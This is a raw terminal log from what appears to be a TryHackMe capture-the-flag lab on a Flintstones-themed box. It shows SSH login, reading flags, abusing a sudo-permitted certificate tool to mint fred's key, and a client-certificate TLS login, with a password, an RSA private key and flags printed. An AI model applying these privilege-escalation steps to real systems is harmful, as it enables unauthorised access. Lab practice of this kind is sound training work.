    0340 - bc 64 32 a8 e9 e9 60 cc-b4 66 b3 bb d7 ce fa 01   .d2...`..f......
    0350 - 44 ac 10 c5 ee a1 66 9f-c0 75 e0 dd a2 02 5f fd   D.....f..u...._.
    0360 - 1a bd 07 9e b0 20 00 42-aa 78 d6 7a 8d c7 16 f6   ..... .B.x.z....
    0370 - 39 36 fc 88 e3 d9 f0 55-07 d7 16 f9 07 4c 67 fc   96.....U.....Lg.
    0380 - c3 1b ea 9e 46 35 71 51-ca 09 a2 25 ad 5c 3c cd   ....F5qQ...%.\<.

    Start Time: 1781179959
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 732192C0759E95F55B7DE646EAAD3DDEE59301457EAD2535CB3B73FB7C8FB3AE
    Session-ID-ctx: 
    Resumption PSK: 639A8A2C93FACAA97B2BB0540384E74EDD8D0045C8268D8BC4129368497F980F28C3019CFDDE5500BC711FD2C6A9D781
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 63 a7 f8 bc 76 05 b5 7c-bf 5a 34 e2 f9 4c b9 42   c...v..|.Z4..L.B
    0010 - 9d 99 8b 4a eb 1f f3 de-0a 65 b0 8e 5d f7 86 d5   ...J.....e..]...
    0020 - cf 1a d5 2a 46 19 b8 dc-e5 9a 9a 32 04 ab 7e b5   ...*F......2..~.
    0030 - eb 7e c1 a0 c2 37 e9 df-de 6d f3 af ae 5b 36 27   .~...7...m...[6'
    0040 - 30 5c 1a 14 e9 e9 0c 94-ea 44 92 af 4a 71 2a 8d   0\.......D..Jq*.
    0050 - 2f 4c 3a 56 92 c7 6e 17-ed b3 43 6b be 73 6e 8e   /L:V..n...Ck.sn.
    0060 - a8 0f d9 56 d6 3f 87 ab-b1 2d d8 35 5d 76 8e 7c   ...V.?...-.5]v.|
    0070 - 1c 2b f4 64 79 de f7 a7-06 f0 11 de ff 4a 42 33   .+.dy........JB3
    0080 - b7 6d 66 38 fd b3 e0 e3-fc 65 0f 0f 94 85 5e c3   .mf8.....e....^.
    0090 - 27 85 b7 c8 79 c0 64 db-a6 52 17 d4 8f 9f 92 f5   '...y.d..R......
    00a0 - 1a cc 80 43 60 38 df 22-db 3d 02 21 17 01 18 6e   ...C`8.".=.!...n
    00b0 - af 31 01 2f 94 87 1d 19-f3 16 79 eb c1 3a f7 52   .1./......y..:.R
    00c0 - 84 cf de 79 3d 00 b8 54-4e 47 02 3c 8a d4 2d 8f   ...y=..TNG.<..-.
    00d0 - 73 29 93 3f 6f 52 35 57-28 fc 3f cd 60 ec d9 29   s).?oR5W(.?.`..)
    00e0 - ac b0 5e 40 22 c2 46 1a-6d 3f 64 63 f0 80 7b 37   ..^@".F.m?dc..{7
    00f0 - e3 7d fd e1 36 99 60 0c-2d ff 6e 36 0e 04 4c e6   .}..6.`.-.n6..L.
    0100 - 09 c4 28 74 37 6e b7 91-50 11 82 39 c8 6a fa 1c   ..(t7n..P..9.j..
    0110 - 92 92 c8 27 40 24 09 98-ca 70 8f 06 1e 9f 15 c9   ...'@$...p......
    0120 - 23 1d 1d ad a2 4b 9d 72-7e 55 96 55 7e 16 fc 41   #....K.r~U.U~..A
    0130 - 18 fa 8f c9 fe ef 95 3e-9a 62 7b 00 48 85 27 ef   .......>.b{.H.'.
    0140 - 55 27 c8 f0 75 14 d9 93-53 b5 ce 3a 57 e9 dc 23   U'..u...S..:W..#
    0150 - 23 34 48 31 a9 99 a2 88-24 32 5d 12 26 91 84 e8   #4H1....$2].&...
    0160 - 6d b0 27 d8 1d 8e 2d da-8a 4f 75 17 45 37 12 f0   m.'...-..Ou.E7..
    0170 - 18 55 c3 73 20 67 aa e9-07 27 fa 3a d1 f3 6b a5   .U.s g...'.:..k.
    0180 - 64 1f 1b 9a c5 a1 9f 3e-de 36 1b 81 43 e6 31 8c   d......>.6..C.1.
    0190 - 21 29 aa df a8 e0 a4 89-86 e3 c5 a6 ea 72 c2 0b   !)...........r..
    01a0 - 1a 67 b7 18 33 f6 09 bb-31 0a fa 60 17 0f 16 02   .g..3...1..`....
    01b0 - a8 8e 80 a9 0e 9f ce 0b-34 fc 20 53 3d 40 c4 65   ........4. S=@.e
    01c0 - 8b d3 83 8b b3 fc 09 df-79 f1 50 74 77 5c f4 59   ........y.Ptw\.Y
    01d0 - 4c 31 ad 55 0b 79 54 6f-95 86 4f 7a 81 42 8e 8c   L1.U.yTo..Oz.B..
    01e0 - 95 3f 13 f3 59 98 e0 e6-f5 6c a8 8a 03 e0 8f 70   .?..Y....l.....p
    01f0 - 17 1e da 61 f3 1f 1e 49-39 fb 63 47 bb eb d8 51   ...a...I9.cG...Q
    0200 - 4c c8 db c1 ce 11 0f 15-c5 66 02 8c 5d cd ad bd   L........f..]...
    0210 - a9 36 2b 3f cc 22 98 bc-a7 57 ea 49 80 cb fe 7e   .6+?."...W.I...~
    0220 - 6e 7a d0 c9 bf 53 99 15-cd d0 df 37 19 27 98 97   nz...S.....7.'..
    0230 - 2d fa a9 e8 51 37 72 cd-7e c8 ff 6d e4 77 53 6b   -...Q7r.~..m.wSk
    0240 - e0 ae 5c 56 cc a8 2c 47-9e 9e 4a 57 d5 f8 61 a8   ..\V..,G..JW..a.
    0250 - 42 d8 cb 2c ad f4 d1 96-84 27 0d 63 21 39 b2 0f   B..,.....'.c!9..
    0260 - d8 94 ea b5 f1 6b 94 86-91 f0 4e 66 14 82 39 9f   .....k....Nf..9.
    0270 - 03 c6 d0 1b 6a e7 00 de-66 27 74 92 0a 0e a7 1a   ....j...f't.....
    0280 - a4 e1 5b be 35 40 90 a9-40 04 32 49 25 06 a9 65   ..[.5@..@.2I%..e
    0290 - 4b 5a ae ca 26 5d b4 a6-a6 54 6e f5 ea 43 5e de   KZ..&]...Tn..C^.
    02a0 - 20 98 9a 35 ed e2 71 e9-26 48 db 5e c2 5c c5 33    ..5..q.&H.^.\.3
    02b0 - d7 f1 3c d4 a8 a0 26 ae-d3 84 24 e8 60 d9 91 31   ..<...&...$.`..1
    02c0 - c9 d7 ca 36 e3 94 fc b6-6e 1c 1c 4d 50 05 50 bd   ...6....n..MP.P.
    02d0 - 3d 58 5c 0d 16 d8 e2 d6-4d bc 91 79 84 5b e0 56   =X\.....M..y.[.V
    02e0 - 74 d8 ac e6 0e d7 46 2f-7f 34 3d 32 0b 79 9a ed   t.....F/.4=2.y..
    02f0 - 5b 41 d1 fa f6 8f c1 d6-99 15 bd 99 e1 ef b7 de   [A..............
    0300 - f2 b9 17 0a 04 22 4c 16-0a 74 33 b0 33 f5 5e d0   ....."L..t3.3.^.
    0310 - 9b 04 44 d2 b0 b0 e0 1c-57 7a 35 85 91 66 ba 46   ..D.....Wz5..f.F
    0320 - d2 2d d9 dd 77 92 5e ca-e5 d7 d9 40 7f aa 82 88   .-..w.^....@....
    0330 - 82 01 d3 9c bf 6e 57 14-26 68 79 f7 f7 4f 3b 5d   .....nW.&hy..O;]
    0340 - a2 3c 42 8f c4 3f 48 3a-98 9b 28 ce 77 ae 89 f1   .<B..?H:..(.w...
    0350 - e1 76 e9 11 a8 7b c8 1a-57 9d 78 0f ef 56 45 4b   .v...{..W.x..VEK
    0360 - ee 86 f4 b8 7a 64 73 fe-51 88 1f 43 48 9d d5 14   ....zds.Q..CH...
    0370 - 88 c7 4c f1 13 b7 23 7d-bf 4c 20 af 75 cd d9 00   ..L...#}.L .u...
    0380 - 6f e3 09 cc 60 f5 92 73-9a 60 46 28 a2 55 6c c9   o...`..s.`F(.Ul.

    Start Time: 1781179959
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
Welcome: 'Barney Rubble' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> 

```


```
ssh barney@10.48.129.249 
The authenticity of host '10.48.129.249 (10.48.129.249)' can't be established.
ED25519 key fingerprint is: SHA256:CaXwsYyUYvgBUCSpTOtm7BPBPs5+oMYg03pD9Qowzl4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.129.249' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
barney@10.48.129.249's password: 
barney@ip-10-48-129-249:~$ ls
barney.txt
barney@ip-10-48-129-249:~$ cat barney.txt 
THM{f05780f08f0eb1de65023069d0e4c90c}
barney@ip-10-48-129-249:~$ ls -la
total 28
drwxr-xr-x 3 barney barney 4096 Apr 30  2022 .
drwxr-xr-x 6 root   root   4096 Jun 11 11:14 ..
-rw------- 1 barney barney   38 Apr 29  2022 barney.txt
lrwxrwxrwx 1 barney barney    9 Apr 28  2022 .bash_history -> /dev/null
-rw-r--r-- 1 barney barney  220 Apr 10  2022 .bash_logout
-rw-r--r-- 1 barney barney 3771 Apr 10  2022 .bashrc
drwx------ 2 barney barney 4096 Apr 30  2022 .cache
-rw-r--r-- 1 root   root      0 Apr 30  2022 .hushlogin
-rw-r--r-- 1 barney barney  807 Apr 10  2022 .profile
lrwxrwxrwx 1 root   root      9 Apr 29  2022 .viminfo -> /dev/null
barney@ip-10-48-129-249:~$ cd ..
barney@ip-10-48-129-249:/home$ ls
barney  fred  ssm-user  ubuntu
barney@ip-10-48-129-249:/home$ cd rred
-bash: cd: rred: No such file or directory
barney@ip-10-48-129-249:/home$ cd fred
barney@ip-10-48-129-249:/home/fred$ ls
fred.txt
barney@ip-10-48-129-249:/home/fred$ cat fred.txt
cat: fred.txt: Permission denied
barney@ip-10-48-129-249:/home/fred$ sudo -l
[sudo] password for barney: 
My mind is going. I can feel it.
[sudo] password for barney: 
Matching Defaults entries for barney on ip-10-48-129-249:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on ip-10-48-129-249:
    (ALL : ALL) /usr/bin/certutil
barney@ip-10-48-129-249:/home/fred$ ls -la /usr/bin/certutil
lrwxrwxrwx 1 root root 27 Apr 29  2022 /usr/bin/certutil -> /usr/share/abc/bin/certutil
barney@ip-10-48-129-249:/home/fred$ /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@ip-10-48-129-249:/home/fred$ /usr/bin/certutil -h

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@ip-10-48-129-249:/home/fred$ sudo /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@ip-10-48-129-249:/home/fred$ sudo /usr/bin/certutil fred 'Fred Flintston'
Generating credentials for user: fred (Fred Flintston)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3nfmbMJPCxIdcJMSlP/V9cNWw55WcRYrtSgVFWapuisrTrb2
NCv/KuuQkF2KxfHy4oMHMhMFjnr9rGJuXzGC01uIPvGhC9aw5NGMxrKmuijpIfHg
b+07aAX2iLV7qOn7+lb6kp7FSvnU3hCHo9x6+Mu+0JL7NHJfWV9RfzB/x1NpICZF
3zGQKk6Pn56073RxxmZ89FW9suKCRYXkU0iadI1LrbPV/H0M480MygV5TY9YPyTP
1zbj5WiXIXDNoBNBCiGYs5Ge2fY4j0gKrPNiSbyemUHwIies4a1MybR3gbAk3ycB
m0iJ7UQO8zpytrIuZjGOnvTxwhTHobO36QNjKwIDAQABAoIBACyLEUYBedYboG1j
5TqUJwD4Ra0RTPmDmOjCx8XrMlymPBucops7m/G6DM37DMgpc5pK5evuxxQKKDSV
2MeSoEE1eIgx1S8Lo4uNMYSvTJbFjjhPt8JxW42uc/hXbhUaFGvBcpZc19/1Odvk
r2Ptx2l9Ug1tAIM1y0WXwjeXPF5qQ1H3UD9zGRWyn9DiRsttW2rnrSGXLZcRU7IJ
/UZHqtIOg3PBiZp8ZBdYe1trQJDaiMyjg3HsgdEZCPtdeOa42UvlkNVaIDh3lBs7
EUJf/KW4nxQh0/e7EDhegWz7z4HeceyHtMsbzVmrtpLa8gbAW3muDV6jnpMZ0kxj
edy569ECgYEA/DMriwowR21Opz4qErTTbLWaZKXDD3mwT6uf9VH4FLoG95zASo3s
rrjGNmYGQ9sgVOPTKsO7naKjoZAevYtPvEtOOlaJpNnUdYvY2KZZSnuLww/Mh54O
4gQueS9RNVFUZlZ94g+LpLXmyd8acGBZE4giDtwSvhFYfYXiqMuJDv0CgYEA4dIL
WPV7KtWqO5PdmX6immJTDxzlfmHL4FzXKLVJyiwe0nESz5i+NAiF8iJ5GknBRVBj
PZI24VPrvfVk3VB3gp+2DS/oOVDdbeX91lfkXTmVeHRU+2PY9Y/9mfuY+jTEtTp5
kqxiew6vtgaiUENWrm835tWh1jomlmK3sTGdl0cCgYEA+Xe4W7nBVfYm9kIEpipe
dMsSpPpe/+DUaYqQGL9zUTVOjQJuJ5FKDO7Tip3TFq4bxjzx9fxVirGFgNwpvD6g
qdYn1IcjcoDSq0+hOXUbIBUjg9kN7RyJBkMyoUcP4ljHzs9BiCrubAhO+WMKKRz1
H9/qKJ7Cn2ZTDR8xvNxQgBUCgYBKfTDFDWStgoF+2Y21fjJA3sIrMAr7n2LTBYzr
nrFSgS9Bl47u76F+JHman4h3BXE9XgD+ZGa5+SbAKFw3LL3fVrOEshLWJTiFceJD
fAaWQdJuQ2Fs80iz5+Vtj7Kshg+FAF7t5PMvSG7pilKsSyoirAkymbGiqtfjr3iM
eKNVLQKBgGGPveapJEAdYauUjeH5ltMnpTNPhP2GiVcNjNJIln9QPkvqpXw4wcoP
m68xPTR3/LY6tIs+4PrC/SYnSuCM6UXfF0wjbm2u2tuwz5RktLcog/mMWEXdSQGw
JXMX640xy4LgZEO9xoT2Gg7bwXoYKzfq27pcpvjaqYgxef/R9vDo
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICojCCAYoCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNjA2MTExMjMzMTNaFw0yNjA2MTIxMjMzMTNaMBkxFzAVBgNVBAMMDkZy
ZWQgRmxpbnRzdG9uMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nfm
bMJPCxIdcJMSlP/V9cNWw55WcRYrtSgVFWapuisrTrb2NCv/KuuQkF2KxfHy4oMH
MhMFjnr9rGJuXzGC01uIPvGhC9aw5NGMxrKmuijpIfHgb+07aAX2iLV7qOn7+lb6
kp7FSvnU3hCHo9x6+Mu+0JL7NHJfWV9RfzB/x1NpICZF3zGQKk6Pn56073RxxmZ8
9FW9suKCRYXkU0iadI1LrbPV/H0M480MygV5TY9YPyTP1zbj5WiXIXDNoBNBCiGY
s5Ge2fY4j0gKrPNiSbyemUHwIies4a1MybR3gbAk3ycBm0iJ7UQO8zpytrIuZjGO
nvTxwhTHobO36QNjKwIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQDdysBdgyz91IIv
1jb5cquX3V/m0dVURiBCWdsKSZOPd/8fkVzlkpMsfIo/7lxXrNlGl76ryIB7H89/
5S17ZDWv0fke8BOQmnaYmfReUoE5B7zRXjh5kvmYIPE6gN4fiD+/grttxG4LfYoU
A0CgdawTkCK/MMvUE+yvzhTIiEA5vBdz8Q5qMGeL1Rm2cuTWYdmDgU8RyeD4ax27
N70WgnkCuW97E3yZR+XM/zY/6xHsR4lf2oKzw751onO40AJWF0G5o6eukdJFp8fV
0N/7v0xijtJf1+ohGBEslFAahXPxtyawfOtiQtjuucL2dpl7ya7Azqb17lvvu6Jm
L0MnWrjm
-----END CERTIFICATE-----
barney@ip-10-48-129-249:/home/fred$ su fred
Password: 
su: Authentication failure
barney@ip-10-48-129-249:/home/fred$ YabbaDabbaD0000! 
YabbaDabbaD0000!: command not found
barney@ip-10-48-129-249:/home/fred$ su fred
Password: 
fred@ip-10-48-129-249:~$ ls -la
total 36
drwxr-xr-x 4 fred fred 4096 Apr 30  2022 .
drwxr-xr-x 6 root root 4096 Jun 11 11:14 ..
lrwxrwxrwx 1 fred fred    9 Apr 28  2022 .bash_history -> /dev/null
-rw-r--r-- 1 fred fred  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 fred fred 3771 Feb 25  2020 .bashrc
drwx------ 2 fred fred 4096 Apr 30  2022 .cache
-rw------- 1 fred fred   38 Apr 29  2022 fred.txt
-rw-rw-r-- 1 fred fred    0 Apr 30  2022 .hushlogin
-rw-r--r-- 1 fred fred  807 Feb 25  2020 .profile
-rw-rw-r-- 1 fred fred   75 Apr 10  2022 .selected_editor
drwx------ 2 fred fred 4096 Apr 29  2022 .ssh
lrwxrwxrwx 1 root root    9 Apr 29  2022 .viminfo -> /dev/null
fred@ip-10-48-129-249:~$ cat fred.txt 
THM{08da34e619da839b154521da7323559d}
fred@ip-10-48-129-249:~$ sudo -l
Matching Defaults entries for fred on ip-10-48-129-249:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-48-129-249:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
fred@ip-10-48-129-249:~$ 

```

```
─(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# nano cert_fred.pem
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# nano fred_key.pem 
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# openssl s_client -connect 10.48.129.249:54321 -cert cert_fred.pem -key fred_key.pem 
Could not find client certificate private key from fred_key.pem
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# openssl s_client -connect 10.48.129.249:54321 -cert cert_fred.pem -key fred_key.pem
Could not find client certificate private key from fred_key.pem
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# openssl rsa -in fred_key.pem -check
Could not find private key from fred_key.pem
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# cat fred_key.pem 
-----BEGIN CERTIFICATE-----
MIICojCCAYoCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNjA2MTExMjMzMTNaFw0yNjA2MTIxMjMzMTNaMBkxFzAVBgNVBAMMDkZy
ZWQgRmxpbnRzdG9uMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nfm
bMJPCxIdcJMSlP/V9cNWw55WcRYrtSgVFWapuisrTrb2NCv/KuuQkF2KxfHy4oMH
MhMFjnr9rGJuXzGC01uIPvGhC9aw5NGMxrKmuijpIfHgb+07aAX2iLV7qOn7+lb6
kp7FSvnU3hCHo9x6+Mu+0JL7NHJfWV9RfzB/x1NpICZF3zGQKk6Pn56073RxxmZ8
9FW9suKCRYXkU0iadI1LrbPV/H0M480MygV5TY9YPyTP1zbj5WiXIXDNoBNBCiGY
s5Ge2fY4j0gKrPNiSbyemUHwIies4a1MybR3gbAk3ycBm0iJ7UQO8zpytrIuZjGO
nvTxwhTHobO36QNjKwIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQDdysBdgyz91IIv
1jb5cquX3V/m0dVURiBCWdsKSZOPd/8fkVzlkpMsfIo/7lxXrNlGl76ryIB7H89/
5S17ZDWv0fke8BOQmnaYmfReUoE5B7zRXjh5kvmYIPE6gN4fiD+/grttxG4LfYoU
A0CgdawTkCK/MMvUE+yvzhTIiEA5vBdz8Q5qMGeL1Rm2cuTWYdmDgU8RyeD4ax27
N70WgnkCuW97E3yZR+XM/zY/6xHsR4lf2oKzw751onO40AJWF0G5o6eukdJFp8fV
0N/7v0xijtJf1+ohGBEslFAahXPxtyawfOtiQtjuucL2dpl7ya7Azqb17lvvu6Jm
L0MnWrjm
-----END CERTIFICATE-----
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# cat cert_fred.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3nfmbMJPCxIdcJMSlP/V9cNWw55WcRYrtSgVFWapuisrTrb2
NCv/KuuQkF2KxfHy4oMHMhMFjnr9rGJuXzGC01uIPvGhC9aw5NGMxrKmuijpIfHg
b+07aAX2iLV7qOn7+lb6kp7FSvnU3hCHo9x6+Mu+0JL7NHJfWV9RfzB/x1NpICZF
3zGQKk6Pn56073RxxmZ89FW9suKCRYXkU0iadI1LrbPV/H0M480MygV5TY9YPyTP
1zbj5WiXIXDNoBNBCiGYs5Ge2fY4j0gKrPNiSbyemUHwIies4a1MybR3gbAk3ycB
m0iJ7UQO8zpytrIuZjGOnvTxwhTHobO36QNjKwIDAQABAoIBACyLEUYBedYboG1j
5TqUJwD4Ra0RTPmDmOjCx8XrMlymPBucops7m/G6DM37DMgpc5pK5evuxxQKKDSV
2MeSoEE1eIgx1S8Lo4uNMYSvTJbFjjhPt8JxW42uc/hXbhUaFGvBcpZc19/1Odvk
r2Ptx2l9Ug1tAIM1y0WXwjeXPF5qQ1H3UD9zGRWyn9DiRsttW2rnrSGXLZcRU7IJ
/UZHqtIOg3PBiZp8ZBdYe1trQJDaiMyjg3HsgdEZCPtdeOa42UvlkNVaIDh3lBs7
EUJf/KW4nxQh0/e7EDhegWz7z4HeceyHtMsbzVmrtpLa8gbAW3muDV6jnpMZ0kxj
edy569ECgYEA/DMriwowR21Opz4qErTTbLWaZKXDD3mwT6uf9VH4FLoG95zASo3s
rrjGNmYGQ9sgVOPTKsO7naKjoZAevYtPvEtOOlaJpNnUdYvY2KZZSnuLww/Mh54O
4gQueS9RNVFUZlZ94g+LpLXmyd8acGBZE4giDtwSvhFYfYXiqMuJDv0CgYEA4dIL
WPV7KtWqO5PdmX6immJTDxzlfmHL4FzXKLVJyiwe0nESz5i+NAiF8iJ5GknBRVBj
PZI24VPrvfVk3VB3gp+2DS/oOVDdbeX91lfkXTmVeHRU+2PY9Y/9mfuY+jTEtTp5
kqxiew6vtgaiUENWrm835tWh1jomlmK3sTGdl0cCgYEA+Xe4W7nBVfYm9kIEpipe
dMsSpPpe/+DUaYqQGL9zUTVOjQJuJ5FKDO7Tip3TFq4bxjzx9fxVirGFgNwpvD6g
qdYn1IcjcoDSq0+hOXUbIBUjg9kN7RyJBkMyoUcP4ljHzs9BiCrubAhO+WMKKRz1
H9/qKJ7Cn2ZTDR8xvNxQgBUCgYBKfTDFDWStgoF+2Y21fjJA3sIrMAr7n2LTBYzr
nrFSgS9Bl47u76F+JHman4h3BXE9XgD+ZGa5+SbAKFw3LL3fVrOEshLWJTiFceJD
fAaWQdJuQ2Fs80iz5+Vtj7Kshg+FAF7t5PMvSG7pilKsSyoirAkymbGiqtfjr3iM
eKNVLQKBgGGPveapJEAdYauUjeH5ltMnpTNPhP2GiVcNjNJIln9QPkvqpXw4wcoP
m68xPTR3/LY6tIs+4PrC/SYnSuCM6UXfF0wjbm2u2tuwz5RktLcog/mMWEXdSQGw
JXMX640xy4LgZEO9xoT2Gg7bwXoYKzfq27pcpvjaqYgxef/R9vDo
-----END RSA PRIVATE KEY-----
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# mv cert_fred.pem temp.pem
mv fred_key.pem cert_fred.pem
mv temp.pem fred_key.pem
                                                                                                                                                              
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# openssl s_client -connect 10.48.129.249:54321 -cert cert_fred.pem -key fred_key.pem
Connecting to 10.48.129.249
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=localhost
verify return:1
---
Certificate chain
 0 s:CN=localhost
   i:CN=localhost
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Jun 11 11:14:35 2026 GMT; NotAfter: Jun 11 11:14:35 2027 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICrzCCAZcCFFP+l9CVM923U0VW5p046Vf8+7pKMA0GCSqGSIb3DQEBCwUAMBQx
EjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yNjA2MTExMTE0MzVaFw0yNzA2MTExMTE0
MzVaMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBAPi96yreZ9CEatyxMb6q3DIBSPj3BUsmyLo02UKd44lpm7Oi9e1c
RlJ40ygKB2/vVk+RjRljRVy9rHnM8bNXx4XK48pklBn4V2Zp6gMRsIo0mYZEXwwp
jO/F2N4DdAkXaCd+cdanTLGND93YuL9snKJJTMIQUZQ2Ymn1sjCT+eh1lviX4v8M
fMtg/sIKGFydNPh24qMJ6uqtfC1io/fb/4Lya9f/Xnf73EMp7P0dF9b48NKrLrBv
7Xgt50Bizj71ZvoBN8MUwRsDDUjojrF63y78/ezOkqQ/0AYOHTA4wG1tGEsVuE3o
2QDyzGOCYSFBzqiocIDXBabAwz8sYuJFD68CAwEAATANBgkqhkiG9w0BAQsFAAOC
AQEA1hLpyR2LrGkmDRF1UwHgpy/wwrpEF9rZTv3LQk4o+wBBl7n6X692bzVVGp2m
Clcyj+FUrfFJa49iLlO1pUkYP7pYz90Lhc5GLdfjfzSBeJkO0CZhsBmjZAQ9sodP
RNkz8fuBPkj4lhHw7OC7uCETzFHpaCAIKQG8YWRqDFjISN6DtXmxNIbXnCSFCZm+
xZZ3AA/LcjLBIYtg4mO5M4a34JYdFxYhYDpVjNMm/KGgK7YhUJqs+76/9wgkdA/o
KyVZ432TlCYa8QbY7WQhybzfMYeFSaWceaU50lc4a3DL29nDDatmnSNRbGAAK8cN
lKtf2061KdN+2m0JTLuzLMCrTw==
-----END CERTIFICATE-----
subject=CN=localhost
issuer=CN=localhost
---
Acceptable client certificate CA names
CN=localhost
Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:ECDSA+SHA1:RSA+SHA224:RSA+SHA1
Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 1348 bytes and written 2737 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 2048 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: DBEDBC8094153F3C77E9DE0E1F68ABD18F14DCCB202432068209B312FC17C3EE
    Session-ID-ctx: 
    Resumption PSK: 06210C168A50C18B1F32932FC0B7F8BE893DDACD243B7D9C180A8D03F03279093A0F6D6BFB4B805CB1DECA0D188848EF
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 63 a7 f8 bc 76 05 b5 7c-bf 5a 34 e2 f9 4c b9 42   c...v..|.Z4..L.B
    0010 - f5 64 9a 0d 6c a0 3b eb-a9 26 f0 75 16 b5 c4 8c   .d..l.;..&.u....
    0020 - 51 3c 04 41 72 2d c5 7a-5d 5a b0 56 05 b2 eb 88   Q<.Ar-.z]Z.V....
    0030 - 6e 16 1c 37 a6 2b 10 3d-6d ed eb 45 9b 40 05 bf   n..7.+.=m..E.@..
    0040 - 4f dd e4 7f ce 69 2e 96-38 27 72 63 a4 fe a3 d4   O....i..8'rc....
    0050 - bf fa f9 2c 6c bf da 5c-ca a8 68 85 42 ab 23 c4   ...,l..\..h.B.#.
